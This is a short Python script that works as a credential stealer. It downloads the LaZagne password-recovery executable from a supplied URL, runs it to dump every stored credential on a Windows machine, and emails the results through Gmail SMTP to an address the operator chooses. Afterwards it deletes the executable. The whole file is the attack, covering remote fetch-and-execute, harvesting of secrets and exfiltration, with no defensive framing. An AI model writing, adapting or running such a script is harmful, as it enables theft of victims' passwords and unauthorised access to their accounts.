#!/usr/bin/env python3
import requests
import subprocess
import argparse
import smtplib
from email.message import EmailMessage
import random
import string
import os
import tempfile


def download_lazagne(url):
    try:
        response = requests.get(url)
        with open('C:lazagne.exe', 'wb') as file:
            file.write(response.content)
    except Exception as e:
        return


def create_email(recipient, email_text):
    """
    Creates an email using the EmailMessage class. Return email class
    """
    msg = EmailMessage()
    msg['Subject'] = f'New exploit - %s' % ''.join(random.choices(string.ascii_letters, k=5))
    msg['From'] = recipient
    msg['To'] = recipient
    msg.set_content(email_text)
    return msg


def send_mail(email_text, recipient, password):
    """
    Sends the email_text to the recipient. Auth using password. No exceptions raised. No return.
    """
    msg = create_email(recipient, email_text)
    server = smtplib.SMTP('smtp.gmail.com', 587)
    try:
        server.ehlo()
        server.starttls()
        server.login(user=recipient, password=password)
        server.send_message(msg)
    except Exception as e:
        server.quit()
        return
    finally:
        server.quit()


def report(email, password):
    cmd = 'lazagne.exe all -v'
    response = subprocess.check_output(cmd)
    send_mail(response.decode('utf-8'), email, password)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', dest='url', help='URL to download LaZagne.', required=True)
    parser.add_argument('-e', dest='email', help='Email to send results of LaZagne output.', required=True)
    parser.add_argument('-p', dest='password', help='Email password.', required=True)
    args = parser.parse_args()
    os.chdir(tempfile.gettempdir())
    download_lazagne(args.url)
    report(args.email, args.password)
    os.remove('lazagne.exe')


